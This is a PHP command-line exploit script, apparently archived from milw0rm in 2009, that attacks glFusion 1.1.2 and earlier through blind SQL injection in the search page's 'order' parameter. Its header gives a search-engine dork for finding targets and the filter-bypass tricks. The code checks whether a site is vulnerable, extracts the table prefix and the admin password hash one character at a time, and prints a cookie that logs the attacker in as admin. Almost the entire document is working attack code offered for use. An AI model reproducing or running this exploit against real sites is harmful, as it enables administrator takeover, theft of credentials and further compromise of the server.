<?php
    /*
        glFusion <= 1.1.2 COM_applyFilter()/order sql injection exploit
        by Nine:Situations:Group::bookoo

        working against Mysql >= 4.1
        php.ini independent
		
	  our site: http://retrogod.altervista.org/
        software site: http://www.glfusion.org/

        google dork: "Page created in" "seconds by glFusion" +RSS

        Vulnerability, sql injection in 'order' and 'direction' arguments:
        look ExecuteQueries() function in /private/system/classes/listfactory.class.php, near line 336:
        ...

        // Get the details for sorting the list
        $this->_sort_arr['field'] = isset($_REQUEST['order']) ? COM_applyFilter($_REQUEST['order']) : $this->_def_sort_arr['field'];
        $this->_sort_arr['direction'] = isset($_REQUEST['direction']) ? COM_applyFilter($_REQUEST['direction']) : $this->_def_sort_arr['direction'];
        if (is_numeric($this->_sort_arr['field'])) {
            $ord = $this->_def_sort_arr['field'];
            $this->_sort_arr['field'] = SQL_TITLE;
        } else {
            $ord = $this->_sort_arr['field'];
        }

        $order_sql = ' ORDER BY ' . $ord . ' ' . strtoupper($this->_sort_arr['direction']);
        ...

        filters are inefficient, see COM_applyFilter() which calls COM_applyBasicFilter()
        in /public/lib-common.php near line 5774.

        We are in an ORDER clause and vars are not surrounded by quotes,
        bad chars are ex. "," , "/" ,"'", ";", "\",""","*","`"
	  but what about spaces and "("... you can use a CASE WHEN .. THEN .. ELSE .. END
	  construct instead of ex. IF(..,..,..) and "--" instead of "/*" to close
	  your query.
	  And ex. the alternative syntax SUBSTR(str FROM n FOR n) instead of
        SUBSTR(str,n,n) in a sub-SELECT statement.
	  Other attacks are possible, COM_applyFilter() is a very common used one.
	
	  Additional notes: 'direction' argument is uppercased by strtoupper(),
	  you know that table identifiers on Unix-like systems are case sensitives
	  but not on MS Windows, however I choosed to inject in the 'order' one
        for better results.
	  Vars come from the $_REQUEST[] array so you can pass it by $_POST[] or
	  $_COOKIE[], which is not intended I suppose.
	  
        This exploit extracts the hash from users table; also note that you do
        not need to crack the hash, you can authenticate as admin with the
        cookie:
		
	  glfusion=[uid]; glf_password=[hash];
		
	  as admin you can upload php files in public folders!
		
	  Very soft mitigations: glFusion does not show the table prefix in sql
        errors, default however is 'gl_'. I prepared a fast routine to extract
        it from information_schema db if availiable.
	  To successfully interrogate MySQL you need at least 2 records in the
        same topic section, however the default installation create 2 links with
        topic "glFusion"
        
    */

        $err[0]="[!] This script is intended to be launched from the cli!";
        $err[1]="[!] You need the curl extesion loaded!";

	  if (php_sapi_name() <> "cli") {
            die($err[0]);	
        }
        if (!extension_loaded('curl')) {
            $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
            if ($win) {
			    !dl("php_curl.dll") ? die($err[1]) : nil;
			}
			else {
			    !dl("php_curl.so") ? die($err[1]) : nil;
			}
        }

	  function syntax(){
	      print (			
	             "Syntax: php ".$argv[0]." [host] [path] [[port]] [OPTIONS]                \n".
	             "Options:                                                                 \n".
		       "--port:[port]       - specify a port                                     \n".
		       "                      default -> 80                                      \n".
		       "--prefix            - try to extract table prefix from information.schema\n".
		       "                      default -> gl_                                     \n".
		       "--uid:[n]           - specify an uid other than default (2,usually admin)\n".
		       "--proxy:[host:port] - use proxy                                          \n".
		       "--enforce           - try even with 'not vulnerable' message             ");
	     die();
	  }

        error_reporting(E_ALL ^ E_NOTICE);
        $host=$argv[1];
        $path=$argv[2];
        $prefix="gl_";      //default
        $uid="2";
        $where= "uid=$uid"; //user id, usually admin, anonymous = 1

	  $argv[2] ? print("[*] Attacking...\n") : syntax();
        $_f_prefix=false;
        $_use_proxy=false;
        $port=80;
        $_enforce=false;

        for ($i=3; $i<$argc; $i++){
            if ( stristr($argv[$i],"--prefix")){
	          $_f_prefix=true;
	      }
	      if ( stristr($argv[$i],"--proxy:")){
	          $_use_proxy=true;
		    $tmp=explode(":",$argv[$i]);
		    $proxy_host=$tmp[1];
		    $proxy_port=(int)$tmp[2];
	      }
	      if ( stristr($argv[$i],"--port:")){
	          $tmp=explode(":",$argv[$i]);
		    $port=(int)$tmp[1];
	      }
	      if ( stristr($argv[$i],"--enforce")){
	          $_enforce=true;
	      }
	      if ( stristr($argv[$i],"--uid")){
		    $tmp=explode(":",$argv[$i]);
		    $uid=(int)$tmp[1];
		    $where="uid=$uid";			
	      }
	  }

        $url = "http://$argv[1]:$port";

        function _s($url,$request)
        {
            global $_use_proxy,$proxy_host,$proxy_port;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7");
            curl_setopt($ch, CURLOPT_TIMEOUT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            if ($_use_proxy){
	        curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
            }
            $_d = curl_exec($ch);
	    if (curl_errno($ch)) {
                die("[!] ".curl_error($ch)."\n");
            } else {
                curl_close($ch);
            }
            return $_d;
        }

        function chk_err($s){
            if (stripos ($s,"\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64")){
	        return true;
	    }
	    else {
	        return false;
	    }
        }

	function xtrct_tpc($_h){
	    $_x=explode("\x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x3f\x74\x6f\x70\x69\x63\x3d",$_h);
	    $_y=array();
	    for ($i=1; $i<count($_x); $i++){
                $_tmp=explode("\x22",$_x[$i]);
                if ((!in_array($_tmp[0],$_y)) and ($_tmp[0]<>'')) {
                    $_y[$i]=$_tmp[0];
                }
            }
	    return $_y;
        }

	$url ="http://$host:$port".$path."index.php";
      $out= _s($url,"");
	$_tpcs=xtrct_tpc($out);
	$_types=array("links","stories","filemgmt","forum");
	$_t=false;
	for ($i=0; $i<count($_tpcs); $i++){
	    for ($j=0; $j<count($_types); $j++){
	        $url ="http://$host:$port".$path."search.php?query=a+a+a&keyType=all&datestart=&dateend=&topic=".$_tpcs[$i]."&type=".$_types[$j]."&author=0&results=25&mode=search";
              $out= _s($url,"");
              $mtchs=explode("\x3e\x32\x2e", $out);
              if (count($mtchs)==2){
                  $_t=true;
		      break;	
		  }
          }
      }

      if ($_t==true){
          $type = $_types[$j];
          $topic= $_tpcs[$i];
      } else {
          $type=  "links";         //section with at least 2 records of the same topic
          $topic= "glFusion";      //existing topic in section
      }

      print("[*] topic -> '".$topic."', type -> '".$type."'\n");
      $prepend="query=&topic=".$topic."&keyType=phrase";
	
	//checking for vulnerability existence ...
	$url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=all&author=0&results=25&mode=search&order=";
      $_d="order=--;";
	$out= _s($url,$_d);

	//version compatibility
      if (stripos($out,"\x73\x68\x6f\x75\x6c\x64\x20\x68\x61\x76\x65\x20\x61\x74\x20\x6c\x65\x61\x73\x74\x20\x33\x20\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73")){
	    $prepend="query=a+a+a&topic=0&keyType=all";
	    $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=all&author=0&results=25&mode=search";
    	    $out= _s($url,$_d);
	}

      if (chk_err($out)) {
	    print("[*] Vulnerable ...\n");
	} else {
	    print("[!] Not vulnerable ...\n");
	    if (!$_enforce){
	        die;	
	    }
	}
	
	switch ($type) {
            case $_types[0]:
                $_order = array("id","url","description","title","hits","date","uid");
	      break;
            case $_types[1]:
                $_order = array("id","title","description","date","uid","hits","url");
            break;
            case $_types[2]:
                $_order = array("id","uid","comments","hits","date","description","url");
            break;
            case $_types[3]:
                $_order = array("id","name","forum","date","title","description","hits","uid");
            break;

      } 	

      function xtrct_lnk($_h){
	    $_x=explode("\x3e\x31\x2e",$_h);
          $_x=explode("\x3c\x61\x20\x68\x72\x65\x66\x3d\x22",$_x[1]);
          $_x=explode("\x22",$_x[1]);
	    return html_entity_decode($_x[0]);
      }

	//checking for exploitability ...
	$sql = urlencode("(CASE WHEN (SELECT 1) THEN 1 ELSE 1 END) LIMIT 1--");
      $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=".$type."&author=0&results=25&mode=search";
      $_d="order=".$sql.";";
	$out= _s($url,$_d);
      if (chk_err($out)) {
     	    die("[!] Mysql < 4.1 ...");
	} else {
	    print "[*] Subquery works, exploiting ...\n";
	}
	
      $_lnks = array();
	$v = array();
	for ($i=0; $i<count($_order); $i++){
	    $sql = urlencode("$_order[$i] LIMIT 1--");
          $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=".$type."&author=0&results=25&mode=search";
          $_d="order=".$sql.";";
	    $_o= _s($url,$_d);
          $l=xtrct_lnk($_o);
	    if (!in_array($l,$_lnks)) {
	        array_push($_lnks,$l);
		  array_push($v,$_order[$i]);
	    }
	    if (count($v)>1) {
	        print "[*] '".$v[0]."' and '".$v[1]."' in ORDER clause returs different records, good! \n";
	        break;
	    }
      }

      if  (count($v)<=1) {die("[!] Unable to interrogate database: ".count(v)." record(s) in table ... need at least 2 with topic '".$topic." in section '".$type."' !");}
   	
      function find_prefix(){
          global $_lnks ,$v, $type, $host, $port, $path, $prepend;
          $_table_name="";
          $j=1;
          print "[*] Table name -> ";
    	    while (!strstr($_table_name,chr(0))){
              $mn=0x00;$mx=0xff;
	        while (1){
	            if (($mx + $mn) % 2 ==1){
                      $c= round(($mx + $mn) / 2) - 1;
                   } else {
		          $c= round(($mx + $mn) / 2);
	            }
	            $sql = urlencode("(CASE WHEN (SELECT (ASCII(SUBSTR(TABLE_NAME FROM $j FOR 1)) >= ".$c.") FROM information_schema.TABLES WHERE TABLE_NAME LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN ".$v[0]." ELSE ".$v[1]." END) LIMIT 1--");
                  $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=".$type."&author=0&results=25&mode=search";
		      $_d="order=".$sql.";";
		      $_o= _s($url,$_d);
		      if (chk_err($_o)) {
     	                die("\n[!] information_schema not availiable!");
	            }
                  $l=xtrct_lnk($_o);
                  if ($l==$_lnks[0]){
                      $mn = $c;
		      }
                  else {
                      $mx = $c - 1;	
	            }
			
		      if (($mx-$mn==1) or ($mx==$mn)){
		          $sql = urlencode("(CASE WHEN (SELECT (ASCII(SUBSTR(TABLE_NAME FROM $j FOR 1)) = ".$mn.") FROM information_schema.tables WHERE TABLE_NAME LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN ".$v[0]." ELSE ".$v[1]." END) LIMIT 1--");
                      $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=".$type."&author=0&results=25&mode=search";
		          $_d="order=".$sql.";";
		          $_o= _s($url,$_d);
		          $l=xtrct_lnk($_o);
		          if ($l==$_lnks[0]){
                          print chr($mn);
                          $_table_name.=chr($mn);
                      } else {
	                    print chr($mx);	
	                    $_table_name.=chr($mx);
	                }
	                break;
	            }
	        }
	    $j++;
          }
	    print "\n";
	    $_prefix = str_replace("trackbackcodes","",$_table_name);
	    return $_prefix;
      }

      if ($_f_prefix == true) {
          $prefix=find_prefix();
	    print "[*] Table prefix -> ".$prefix."\n";
      }

      $c=array();$c=array_merge($c,range(0x30,0x39));$c=array_merge($c,range(0x61,0x66));
      print "[*] hash -> ";
      $_hash="";
      for ($j=1; $j<0x21; $j++){
          for ($i=1; $i<=0xff; $i++){
	        $f=false;
 	        if (in_array($i,$c)){
	            $sql = urlencode("(CASE WHEN (SELECT (ASCII(SUBSTR(PASSWD FROM $j FOR 1))=$i) FROM ".$prefix."users WHERE $where LIMIT 1) THEN ".$v[0]." ELSE ".$v[1]." END) LIMIT 1--");
                  $url ="http://$host:$port".$path."search.php?".$prepend."&datestart=&dateend=1&type=".$type."&author=0&results=25&mode=search";
                  $_d="order=".$sql.";";
		      $_o= _s($url,$_d);
		      if (chk_err($_o)) {
     	                die("\n[!] wrong table prefix!");
	            }
                  $l=xtrct_lnk($_o);
                  if ($l==$_lnks[0]){
                      $f=true;
		          $_hash.=chr($i);
		          print chr($i); break;
		      }
              }
	    }
	    if ($f==false){
              die("\n[!] Unknown error ...");		
	    }
      }  
      print "\n[*] your cookie -> glfusion=".$uid."; glf_password=".$_hash."; glf_theme=nouveau;";
?>

# milw0rm.com [2009-03-29]
